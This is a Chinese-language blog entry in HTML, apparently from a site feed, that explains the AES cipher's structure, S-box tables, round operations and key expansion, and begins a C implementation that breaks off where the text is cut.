        <content type="html"><![CDATA[<h1 id="AES加密算法"><a href="#AES加密算法" class="headerlink" title="AES加密算法"></a>AES加密算法</h1><p>基于<a href="https://blog.csdn.net/qq_28205153/article/details/55798628?ops_request_misc=%7B%22request_id%22:%22F5D4AACB-DB26-43C7-A691-56F69E7F0DFF%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=F5D4AACB-DB26-43C7-A691-56F69E7F0DFF&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_positive~default-1-55798628-null-null.nonecase&utm_term=aes&spm=1018.2226.3001.4450">AES加密算法原理的详细介绍与实现-CSDN博客</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>取自<a href="https://baike.baidu.com/item/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86/468774?fr=ge_ala">高级加密标准_百度百科</a></p><p>密码学中的高级加密标准（Advanced Encryption Standard，AES），又称Rijndael<a href="https://baike.baidu.com/item/%E5%8A%A0%E5%AF%86%E6%B3%95/9684302?fromModule=lemma_inlink">加密法</a>，是<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BD%E8%81%94%E9%82%A6%E6%94%BF%E5%BA%9C/8370227?fromModule=lemma_inlink">美国联邦政府</a>采用的一种区块加密标准。</p><p>这个标准用来替代原先的<a href="https://baike.baidu.com/item/DES/0?fromModule=lemma_inlink">DES</a>（Data Encryption Standard），已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院 （NIST）于2001年11月26日发布于FIPS PUB 197，并在2002年5月26日成为有效的标准。2006年，高级加密标准已然成为<strong>对称密钥加密</strong>中最流行的算法之一 [1]。</p><p>该算法为比利时密码学家Joan Daemen和Vincent Rijmen所设计，结合两位作者的名字，以Rijdael之名命之，投稿高级加密标准的甄选流程。（Rijdael的发音近于 “Rhine doll”。）</p><h3 id="常见应用"><a href="#常见应用" class="headerlink" title="常见应用"></a><strong>常见应用</strong></h3><p>微信小程序的加密传输</p><h3 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h3><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20241104083742870.png" alt="image-20241104083742870"></p><ul><li><p>明文P</p><p>你想加密的数据</p></li><li><p>密钥K</p><p>用来加密明文的密码，因为是对称加密，所以加密解密的密钥是相同的，<strong>密钥的传输</strong>：不会直接在网上明文传输，要么是非对称加密后传输，或者线下面对面直接说</p></li><li><p>AES加密函数</p><p>将明文结合密钥加密后得到密文</p></li><li><p>密文C</p><p>经加密函数加密后的数据</p></li><li><p>AES解密函数</p><p>将密文结合密钥解密后得到明文，问题关键，加密函数和解密函数是不同的，所以直接将密文再过一遍加密函数也不能得到明文</p></li></ul><h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a><strong>小知识</strong></h3><p><strong>对称加密</strong></p><ul><li>密钥相同的加解密</li></ul><p>优点：</p><p>加密速度快，适合大数据加密</p><p>缺点：</p><p>密钥传输，一旦密钥被知道，加密就没意义了</p><p><strong>非对称加密</strong></p><ul><li>加解密密钥不同</li></ul><p>一共两个密钥，自己手里有个密钥叫私钥，散播在别人手里的叫公钥，只允许别人向你传输数据，别人用公钥加密，将加密数据传给你后，你使用私钥解密</p><p>优点：</p><p>安全</p><p>缺点</p><p>加密速度较慢，适合小数据传输</p><h2 id="AES的基本结构"><a href="#AES的基本结构" class="headerlink" title="AES的基本结构"></a>AES的基本结构</h2><p>AES为分组密码</p><p><strong>分组密码</strong></p><p>将明文分成一组一组的，每组长度相同，每次加密一组数据，直到加密完整的明文</p><p>AES标准规范中，<strong>分组长度只能是128位</strong>，也有是说每个分组时16个字节，但是密钥的长度可以用128位，192位或256位，密钥的长度不同，加密的轮次也不同</p><table><thead><tr><th>AES</th><th>密钥长度（32位比特字)</th><th>分组长度(32位比特字)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>4</td><td>4</td><td>10</td></tr><tr><td>AES-192</td><td>6</td><td>4</td><td>12</td></tr><tr><td>AES-256</td><td>8</td><td>4</td><td>14</td></tr></tbody></table><p><strong>以AES-128举例</strong></p><p>在加密算法中会有一个轮函数，这个轮函数会执行10次，前9次一样，只有第10次会有一点不同</p><p>首先输入的是16个字节，可以看成一个4*4的矩阵，经过AES的十次加密后密文的<strong>排序</strong>是他的对称矩阵（其中S0~S15只是表示位置状态）</p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20241104091117081.png" alt="image-20241104091117081"></p><p><strong>对密钥的处理</strong></p><p>128位的密钥其实也是用字节单位的排序，</p><p>矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：</p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20241104091617418.png" alt="image-20241104091617418"></p><p>上图中，设K &#x3D; “abcdefghijklmnop”，则K0 &#x3D; a, K15 &#x3D; p, W[0] &#x3D; K0 K1 K2 K3 &#x3D; “abcd”。</p><p>AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/574604ab6bf5f632f275528b95a4d8a2.png" alt="img"></p><h3 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h3><p>AES就是一个查表操作。AES定义了一个S盒和一个逆S盒</p><p>以下是S盒</p><table><thead><tr><th align="left">行&#x2F;列</th><th align="left">0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">A</th><th align="left">B</th><th align="left">C</th><th align="left">D</th><th align="left">E</th><th align="left">F</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">0x63</td><td align="left">0x7c</td><td align="left">0x77</td><td align="left">0x7b</td><td align="left">0xf2</td><td align="left">0x6b</td><td align="left">0x6f</td><td align="left">0xc5</td><td align="left">0x30</td><td align="left">0x01</td><td align="left">0x67</td><td align="left">0x2b</td><td align="left">0xfe</td><td align="left">0xd7</td><td align="left">0xab</td><td align="left">0x76</td></tr><tr><td align="left">1</td><td align="left">0xca</td><td align="left">0x82</td><td align="left">0xc9</td><td align="left">0x7d</td><td align="left">0xfa</td><td align="left">0x59</td><td align="left">0x47</td><td align="left">0xf0</td><td align="left">0xad</td><td align="left">0xd4</td><td align="left">0xa2</td><td align="left">0xaf</td><td align="left">0x9c</td><td align="left">0xa4</td><td align="left">0x72</td><td align="left">0xc0</td></tr><tr><td align="left">2</td><td align="left">0xb7</td><td align="left">0xfd</td><td align="left">0x93</td><td align="left">0x26</td><td align="left">0x36</td><td align="left">0x3f</td><td align="left">0xf7</td><td align="left">0xcc</td><td align="left">0x34</td><td align="left">0xa5</td><td align="left">0xe5</td><td align="left">0xf1</td><td align="left">0x71</td><td align="left">0xd8</td><td align="left">0x31</td><td align="left">0x15</td></tr><tr><td align="left">3</td><td align="left">0x04</td><td align="left">0xc7</td><td align="left">0x23</td><td align="left">0xc3</td><td align="left">0x18</td><td align="left">0x96</td><td align="left">0x05</td><td align="left">0x9a</td><td align="left">0x07</td><td align="left">0x12</td><td align="left">0x80</td><td align="left">0xe2</td><td align="left">0xeb</td><td align="left">0x27</td><td align="left">0xb2</td><td align="left">0x75</td></tr><tr><td align="left">4</td><td align="left">0x09</td><td align="left">0x83</td><td align="left">0x2c</td><td align="left">0x1a</td><td align="left">0x1b</td><td align="left">0x6e</td><td align="left">0x5a</td><td align="left">0xa0</td><td align="left">0x52</td><td align="left">0x3b</td><td align="left">0xd6</td><td align="left">0xb3</td><td align="left">0x29</td><td align="left">0xe3</td><td align="left">0x2f</td><td align="left">0x84</td></tr><tr><td align="left">5</td><td align="left">0x53</td><td align="left">0xd1</td><td align="left">0x00</td><td align="left">0xed</td><td align="left">0x20</td><td align="left">0xfc</td><td align="left">0xb1</td><td align="left">0x5b</td><td align="left">0x6a</td><td align="left">0xcb</td><td align="left">0xbe</td><td align="left">0x39</td><td align="left">0x4a</td><td align="left">0x4c</td><td align="left">0x58</td><td align="left">0xcf</td></tr><tr><td align="left">6</td><td align="left">0xd0</td><td align="left">0xef</td><td align="left">0xaa</td><td align="left">0xfb</td><td align="left">0x43</td><td align="left">0x4d</td><td align="left">0x33</td><td align="left">0x85</td><td align="left">0x45</td><td align="left">0xf9</td><td align="left">0x02</td><td align="left">0x7f</td><td align="left">0x50</td><td align="left">0x3c</td><td align="left">0x9f</td><td align="left">0xa8</td></tr><tr><td align="left">7</td><td align="left">0x51</td><td align="left">0xa3</td><td align="left">0x40</td><td align="left">0x8f</td><td align="left">0x92</td><td align="left">0x9d</td><td align="left">0x38</td><td align="left">0xf5</td><td align="left">0xbc</td><td align="left">0xb6</td><td align="left">0xda</td><td align="left">0x21</td><td align="left">0x10</td><td align="left">0xff</td><td align="left">0xf3</td><td align="left">0xd2</td></tr><tr><td align="left">8</td><td align="left">0xcd</td><td align="left">0x0c</td><td align="left">0x13</td><td align="left">0xec</td><td align="left">0x5f</td><td align="left">0x97</td><td align="left">0x44</td><td align="left">0x17</td><td align="left">0xc4</td><td align="left">0xa7</td><td align="left">0x7e</td><td align="left">0x3d</td><td align="left">0x64</td><td align="left">0x5d</td><td align="left">0x19</td><td align="left">0x73</td></tr><tr><td align="left">9</td><td align="left">0x60</td><td align="left">0x81</td><td align="left">0x4f</td><td align="left">0xdc</td><td align="left">0x22</td><td align="left">0x2a</td><td align="left">0x90</td><td align="left">0x88</td><td align="left">0x46</td><td align="left">0xee</td><td align="left">0xb8</td><td align="left">0x14</td><td align="left">0xde</td><td align="left">0x5e</td><td align="left">0x0b</td><td align="left">0xdb</td></tr><tr><td align="left">A</td><td align="left">0xe0</td><td align="left">0x32</td><td align="left">0x3a</td><td align="left">0x0a</td><td align="left">0x49</td><td align="left">0x06</td><td align="left">0x24</td><td align="left">0x5c</td><td align="left">0xc2</td><td align="left">0xd3</td><td align="left">0xac</td><td align="left">0x62</td><td align="left">0x91</td><td align="left">0x95</td><td align="left">0xe4</td><td align="left">0x79</td></tr><tr><td align="left">B</td><td align="left">0xe7</td><td align="left">0xc8</td><td align="left">0x37</td><td align="left">0x6d</td><td align="left">0x8d</td><td align="left">0xd5</td><td align="left">0x4e</td><td align="left">0xa9</td><td align="left">0x6c</td><td align="left">0x56</td><td align="left">0xf4</td><td align="left">0xea</td><td align="left">0x65</td><td align="left">0x7a</td><td align="left">0xae</td><td align="left">0x08</td></tr><tr><td align="left">C</td><td align="left">0xba</td><td align="left">0x78</td><td align="left">0x25</td><td align="left">0x2e</td><td align="left">0x1c</td><td align="left">0xa6</td><td align="left">0xb4</td><td align="left">0xc6</td><td align="left">0xe8</td><td align="left">0xdd</td><td align="left">0x74</td><td align="left">0x1f</td><td align="left">0x4b</td><td align="left">0xbd</td><td align="left">0x8b</td><td align="left">0x8a</td></tr><tr><td align="left">D</td><td align="left">0x70</td><td align="left">0x3e</td><td align="left">0xb5</td><td align="left">0x66</td><td align="left">0x48</td><td align="left">0x03</td><td align="left">0xf6</td><td align="left">0x0e</td><td align="left">0x61</td><td align="left">0x35</td><td align="left">0x57</td><td align="left">0xb9</td><td align="left">0x86</td><td align="left">0xc1</td><td align="left">0x1d</td><td align="left">0x9e</td></tr><tr><td align="left">E</td><td align="left">0xe1</td><td align="left">0xf8</td><td align="left">0x98</td><td align="left">0x11</td><td align="left">0x69</td><td align="left">0xd9</td><td align="left">0x8e</td><td align="left">0x94</td><td align="left">0x9b</td><td align="left">0x1e</td><td align="left">0x87</td><td align="left">0xe9</td><td align="left">0xce</td><td align="left">0x55</td><td align="left">0x28</td><td align="left">0xdf</td></tr><tr><td align="left">F</td><td align="left">0x8c</td><td align="left">0xa1</td><td align="left">0x89</td><td align="left">0x0d</td><td align="left">0xbf</td><td align="left">0xe6</td><td align="left">0x42</td><td align="left">0x68</td><td align="left">0x41</td><td align="left">0x99</td><td align="left">0x2d</td><td align="left">0x0f</td><td align="left">0xb0</td><td align="left">0x54</td><td align="left">0xbb</td><td align="left">0x16</td></tr></tbody></table><p>将一个字节的高4位为行值，低4位为列值，比如说0x23，就是找到行为2列为3的是0x26</p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20241104092907192.png" alt="image-20241104092907192"></p><h4 id="字节代换逆操作"><a href="#字节代换逆操作" class="headerlink" title="字节代换逆操作"></a>字节代换逆操作</h4><p>同样有个逆S盒</p><table><thead><tr><th align="left">行&#x2F;列</th><th align="left">0</th><th align="left">1</th><th align="left">2</th><th align="left">3</th><th align="left">4</th><th align="left">5</th><th align="left">6</th><th align="left">7</th><th align="left">8</th><th align="left">9</th><th align="left">A</th><th align="left">B</th><th align="left">C</th><th align="left">D</th><th align="left">E</th><th align="left">F</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">0x52</td><td align="left">0x09</td><td align="left">0x6a</td><td align="left">0xd5</td><td align="left">0x30</td><td align="left">0x36</td><td align="left">0xa5</td><td align="left">0x38</td><td align="left">0xbf</td><td align="left">0x40</td><td align="left">0xa3</td><td align="left">0x9e</td><td align="left">0x81</td><td align="left">0xf3</td><td align="left">0xd7</td><td align="left">0xfb</td></tr><tr><td align="left">1</td><td align="left">0x7c</td><td align="left">0xe3</td><td align="left">0x39</td><td align="left">0x82</td><td align="left">0x9b</td><td align="left">0x2f</td><td align="left">0xff</td><td align="left">0x87</td><td align="left">0x34</td><td align="left">0x8e</td><td align="left">0x43</td><td align="left">0x44</td><td align="left">0xc4</td><td align="left">0xde</td><td align="left">0xe9</td><td align="left">0xcb</td></tr><tr><td align="left">2</td><td align="left">0x54</td><td align="left">0x7b</td><td align="left">0x94</td><td align="left">0x32</td><td align="left">0xa6</td><td align="left">0xc2</td><td align="left">0x23</td><td align="left">0x3d</td><td align="left">0xee</td><td align="left">0x4c</td><td align="left">0x95</td><td align="left">0x0b</td><td align="left">0x42</td><td align="left">0xfa</td><td align="left">0xc3</td><td align="left">0x4e</td></tr><tr><td align="left">3</td><td align="left">0x08</td><td align="left">0x2e</td><td align="left">0xa1</td><td align="left">0x66</td><td align="left">0x28</td><td align="left">0xd9</td><td align="left">0x24</td><td align="left">0xb2</td><td align="left">0x76</td><td align="left">0x5b</td><td align="left">0xa2</td><td align="left">0x49</td><td align="left">0x6d</td><td align="left">0x8b</td><td align="left">0xd1</td><td align="left">0x25</td></tr><tr><td align="left">4</td><td align="left">0x72</td><td align="left">0xf8</td><td align="left">0xf6</td><td align="left">0x64</td><td align="left">0x86</td><td align="left">0x68</td><td align="left">0x98</td><td align="left">0x16</td><td align="left">0xd4</td><td align="left">0xa4</td><td align="left">0x5c</td><td align="left">0xcc</td><td align="left">0x5d</td><td align="left">0x65</td><td align="left">0xb6</td><td align="left">0x92</td></tr><tr><td align="left">5</td><td align="left">0x6c</td><td align="left">0x70</td><td align="left">0x48</td><td align="left">0x50</td><td align="left">0xfd</td><td align="left">0xed</td><td align="left">0xb9</td><td align="left">0xda</td><td align="left">0x5e</td><td align="left">0x15</td><td align="left">0x46</td><td align="left">0x57</td><td align="left">0xa7</td><td align="left">0x8d</td><td align="left">0x9d</td><td align="left">0x84</td></tr><tr><td align="left">6</td><td align="left">0x90</td><td align="left">0xd8</td><td align="left">0xab</td><td align="left">0x00</td><td align="left">0x8c</td><td align="left">0xbc</td><td align="left">0xd3</td><td align="left">0x0a</td><td align="left">0xf7</td><td align="left">0xe4</td><td align="left">0x58</td><td align="left">0x05</td><td align="left">0xb8</td><td align="left">0xb3</td><td align="left">0x45</td><td align="left">0x06</td></tr><tr><td align="left">7</td><td align="left">0xd0</td><td align="left">0x2c</td><td align="left">0x1e</td><td align="left">0x8f</td><td align="left">0xca</td><td align="left">0x3f</td><td align="left">0x0f</td><td align="left">0x02</td><td align="left">0xc1</td><td align="left">0xaf</td><td align="left">0xbd</td><td align="left">0x03</td><td align="left">0x01</td><td align="left">0x13</td><td align="left">0x8a</td><td align="left">0x6b</td></tr><tr><td align="left">8</td><td align="left">0x3a</td><td align="left">0x91</td><td align="left">0x11</td><td align="left">0x41</td><td align="left">0x4f</td><td align="left">0x67</td><td align="left">0xdc</td><td align="left">0xea</td><td align="left">0x97</td><td align="left">0xf2</td><td align="left">0xcf</td><td align="left">0xce</td><td align="left">0xf0</td><td align="left">0xb4</td><td align="left">0xe6</td><td align="left">0x73</td></tr><tr><td align="left">9</td><td align="left">0x96</td><td align="left">0xac</td><td align="left">0x74</td><td align="left">0x22</td><td align="left">0xe7</td><td align="left">0xad</td><td align="left">0x35</td><td align="left">0x85</td><td align="left">0xe2</td><td align="left">0xf9</td><td align="left">0x37</td><td align="left">0xe8</td><td align="left">0x1c</td><td align="left">0x75</td><td align="left">0xdf</td><td align="left">0x6e</td></tr><tr><td align="left">A</td><td align="left">0x47</td><td align="left">0xf1</td><td align="left">0x1a</td><td align="left">0x71</td><td align="left">0x1d</td><td align="left">0x29</td><td align="left">0xc5</td><td align="left">0x89</td><td align="left">0x6f</td><td align="left">0xb7</td><td align="left">0x62</td><td align="left">0x0e</td><td align="left">0xaa</td><td align="left">0x18</td><td align="left">0xbe</td><td align="left">0x1b</td></tr><tr><td align="left">B</td><td align="left">0xfc</td><td align="left">0x56</td><td align="left">0x3e</td><td align="left">0x4b</td><td align="left">0xc6</td><td align="left">0xd2</td><td align="left">0x79</td><td align="left">0x20</td><td align="left">0x9a</td><td align="left">0xdb</td><td align="left">0xc0</td><td align="left">0xfe</td><td align="left">0x78</td><td align="left">0xcd</td><td align="left">0x5a</td><td align="left">0xf4</td></tr><tr><td align="left">C</td><td align="left">0x1f</td><td align="left">0xdd</td><td align="left">0xa8</td><td align="left">0x33</td><td align="left">0x88</td><td align="left">0x07</td><td align="left">0xc7</td><td align="left">0x31</td><td align="left">0xb1</td><td align="left">0x12</td><td align="left">0x10</td><td align="left">0x59</td><td align="left">0x27</td><td align="left">0x80</td><td align="left">0xec</td><td align="left">0x5f</td></tr><tr><td align="left">D</td><td align="left">0x60</td><td align="left">0x51</td><td align="left">0x7f</td><td align="left">0xa9</td><td align="left">0x19</td><td align="left">0xb5</td><td align="left">0x4a</td><td align="left">0x0d</td><td align="left">0x2d</td><td align="left">0xe5</td><td align="left">0x7a</td><td align="left">0x9f</td><td align="left">0x93</td><td align="left">0xc9</td><td align="left">0x9c</td><td align="left">0xef</td></tr><tr><td align="left">E</td><td align="left">0xa0</td><td align="left">0xe0</td><td align="left">0x3b</td><td align="left">0x4d</td><td align="left">0xae</td><td align="left">0x2a</td><td align="left">0xf5</td><td align="left">0xb0</td><td align="left">0xc8</td><td align="left">0xeb</td><td align="left">0xbb</td><td align="left">0x3c</td><td align="left">0x83</td><td align="left">0x53</td><td align="left">0x99</td><td align="left">0x61</td></tr><tr><td align="left">F</td><td align="left">0x17</td><td align="left">0x2b</td><td align="left">0x04</td><td align="left">0x7e</td><td align="left">0xba</td><td align="left">0x77</td><td align="left">0xd6</td><td align="left">0x26</td><td align="left">0xe1</td><td align="left">0x69</td><td align="left">0x14</td><td align="left">0x63</td><td align="left">0x55</td><td align="left">0x21</td><td align="left">0x0c</td><td align="left">0x7d</td></tr></tbody></table><h3 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h3><p>列混合通过矩阵相乘实现，经过移位后的状态矩阵和固定的矩阵相乘</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/e2c06e75355a5646c48e9e34d6b6ae8c.png" alt="img"></p><h4 id="列混合逆运算"><a href="#列混合逆运算" class="headerlink" title="列混合逆运算"></a>列混合逆运算</h4><p><img src="https://i-blog.csdnimg.cn/blog_migrate/e185a2ec3da68bace0be86170a7661d8.png" alt="col6"></p><h3 id="轮密钥"><a href="#轮密钥" class="headerlink" title="轮密钥"></a>轮密钥</h3><p>轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作，如下图所示。其中，密钥Ki中每个字W[4i],W[4i+1],W[4i+2],W[4i+3]为32位比特字，包含4个字节，他们的生成算法下面在下面介绍。轮密钥加过程可以看成是字逐位异或的结果，也可以看成字节级别或者位级别的操作。也就是说，可以看成S0 S1 S2 S3 组成的32位字与W[4i]的异或运算。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/60bb2a8f1d7c31bceac9d062272d3ad2.png" alt="roundadd"></p><h4 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h4><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6a5033dcebea415390da5b2a771b8495.png" alt="keyextends"></p><h2 id="AES算法实现"><a href="#AES算法实现" class="headerlink" title="AES算法实现"></a>AES算法实现</h2><p>C语言</p><p>aes.h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#ifndef AES_H</span><br><span class="line">#define AES_H</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 参数 p: 明文的字符串数组。</span><br><span class="line"> * 参数 plen: 明文的长度,长度必须为16的倍数。</span><br><span class="line"> * 参数 key: 密钥的字符串数组。</span><br><span class="line"> */</span><br><span class="line">void aes(char *p, int plen, char *key);</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 参数 c: 密文的字符串数组。</span><br><span class="line"> * 参数 clen: 密文的长度,长度必须为16的倍数。</span><br><span class="line"> * 参数 key: 密钥的字符串数组。</span><br><span class="line"> */</span><br><span class="line">void deAes(char *c, int clen, char *key);</span><br><span class="line"></span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>aes.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span 